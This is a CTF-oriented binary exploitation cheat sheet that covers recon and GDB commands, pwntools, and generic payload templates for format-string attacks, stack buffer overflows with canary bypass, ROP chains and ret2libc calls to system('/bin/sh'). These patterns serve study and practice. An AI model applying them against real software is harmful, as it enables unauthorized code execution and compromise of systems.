# PWN Exploitation Cheat Sheet

## Quick Command Reference

### Reconnaissance
```bash
file <binary>                    # Check architecture and type
checksec <binary>                # Check security features
strings <binary> | grep <term>   # Find strings
nm <binary>                      # List symbols
objdump -d <binary>              # Disassemble
readelf -h <binary>              # ELF header info
```

### Analysis Tools
```bash
# Disassembly
objdump -d -M intel <binary>     # Intel syntax
objdump -d <binary> | grep -A 10 "<function>"

# Find gadgets
ROPgadget --binary <binary>
ROPgadget --binary <binary> | grep "pop.*ret"

# Find strings and their addresses
rabin2 -z <binary>
strings -a -t x <binary>
```

### GDB Commands
```bash
# Basic
gdb <binary>
break main
break *0x08048000
run
continue
stepi  # Step one instruction
nexti  # Step over calls

# Inspection
info registers
x/10wx $esp    # Examine 10 words at ESP
x/s 0x08048000 # Examine string at address
disassemble <function>

# With pwndbg
vmmap          # Show memory mappings
cyclic 100     # Generate cyclic pattern
cyclic -l 0x61616161  # Find offset
```

## Pwntools Quick Reference

### Basic Setup
```python
from pwn import *

context.arch = 'i386'  # or 'amd64'
context.log_level = 'debug'  # or 'info', 'warning'

# Connect
p = process('./binary')
p = remote('host', port)
p = ssh('user', 'host', password='pass').process('/path/to/binary')
```

### Data Packing
```python
# Pack/unpack integers
p32(0x12345678)  # Pack 32-bit little-endian
p64(0x123456789abcdef)  # Pack 64-bit
u32(data)        # Unpack 32-bit
u64(data)        # Unpack 64-bit

# Flat packing
flat([0x1234, 0x5678, b'AAAA'])
```

### Interaction
```python
p.sendline(data)      # Send data + newline
p.send(data)          # Send data without newline
p.recv(n)             # Receive n bytes
p.recvline()          # Receive until newline
p.recvuntil(delim)    # Receive until delimiter
p.recvall()           # Receive until EOF
p.interactive()       # Interactive mode
p.clean()             # Flush buffers
```

### ELF Manipulation
```python
elf = ELF('./binary')
elf.address = 0x56550000  # Set base for PIE
elf.symbols['main']       # Get symbol address
elf.got['puts']           # Get GOT entry
elf.plt['puts']           # Get PLT entry
```

### ROP Tools
```python
rop = ROP(elf)
rop.call('function', [arg1, arg2])
rop.raw(0x41414141)
rop.search(move=0, regs=['rdi'])
print(rop.dump())
rop.chain()  # Get bytes
```

## Common Vulnerability Patterns

### Format String
```python
# Leak stack
payload = b'%p.' * 20

# Leak at specific position
payload = b'%3$p'    # Position 3

# Write to address (advanced)
addr = 0x804a000
payload = p32(addr) + b'%7$n'  # Write to position 7
```

### Buffer Overflow
```python
# Basic overflow
payload = b'A' * offset
payload += p32(return_address)

# With canary bypass
payload = b'A' * offset
payload += p32(canary)
payload += p32(saved_ebp)
payload += p32(return_address)
```

### ROP Chain (i386)
```python
# Call function(arg)
payload = flat([
    overflow_padding,
    canary,
    saved_ebp,
    func_addr,
    pop_ret_gadget,  # Clean up
    arg1,
    next_func_addr
])
```

### ROP Chain (x86-64)
```python
# Arguments in registers: RDI, RSI, RDX, RCX, R8, R9
payload = flat([
    overflow_padding,
    canary,
    pop_rdi_ret,
    arg1,
    pop_rsi_ret,
    arg2,
    func_addr
])
```

## Exploitation Patterns

### Pattern 1: ret2win
```python
# Just overflow to win function
payload = b'A' * offset + p32(win_addr)
```

### Pattern 2: ret2libc
```python
# 1. Leak libc address
payload1 = flat([padding, puts_plt, pop_ret, puts_got])
p.sendline(payload1)
leak = u32(p.recv(4))
libc_base = leak - libc.symbols['puts']

# 2. Call system("/bin/sh")
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
payload2 = flat([padding, system_addr, 0, binsh_addr])
```

### Pattern 3: Info Leak + ROP
```python
# 1. Leak with format string
p.sendline(b'%3$p')
leak = int(p.recvline().strip(), 16)
base = leak - offset

# 2. ROP with leaked addresses
payload = build_rop_chain(base)
p.sendline(payload)
```

## Common Mistakes to Avoid

❌ **Wrong**: `int(values[0])`  
✅ **Right**: `int(values[0], 16)`

❌ **Wrong**: `payload = b'A' * 30` (wrong size)  
✅ **Right**: Calculate exact offset

❌ **Wrong**: Using addresses without PIE/ASLR adjustment  
✅ **Right**: `addr = base + offset`

❌ **Wrong**: Forgetting argument cleanup in ROP  
✅ **Right**: Use `pop; ret` gadgets

❌ **Wrong**: Not checking canary position  
✅ **Right**: Leak and use correct canary

## Quick Debugging Tips

1. **Add debug output**: `log.info(f"Address: {hex(addr)}")`
2. **Test locally first**: `p = process('./binary')`
3. **Use GDB**: Attach with `gdb.attach(p, 'break main')`
4. **Check return codes**: `p.poll()` to see crash status
5. **Verify leaks**: Print hex values to ensure correct parsing

## Offset Calculation

```python
# Find offset with cyclic pattern
pattern = cyclic(200)
# Crash shows: 0x62616164
offset = cyclic_find(0x62616164)  # or cyclic_find('daab')

# Or calculate manually
# If buffer is 32 bytes, canary is at 32, return address at 44
offset_to_return = 32 + 4 + 4 + 4  # buffer + canary + ebp + ebx
```

## Essential Exploits to Study

1. **Buffer Overflow**: Basic stack smashing
2. **Format String**: Read/write arbitrary memory  
3. **ret2libc**: Bypass NX
4. **ROP**: Complex control flow
5. **Heap Exploitation**: Use-after-free, double-free
6. **Race Conditions**: TOCTOU bugs

## Online Resources

- **Practice**: pwnable.kr, pwnable.tw, ropemporium.com
- **Learning**: pwn.college, exploit.education
- **CTF**: ctftime.org
- **Discord**: Many CTF team servers for help
- **Tools**: pwntools docs, GDB pwndbg/peda

---

**Pro Tip**: Always understand WHY something works, not just that it works!
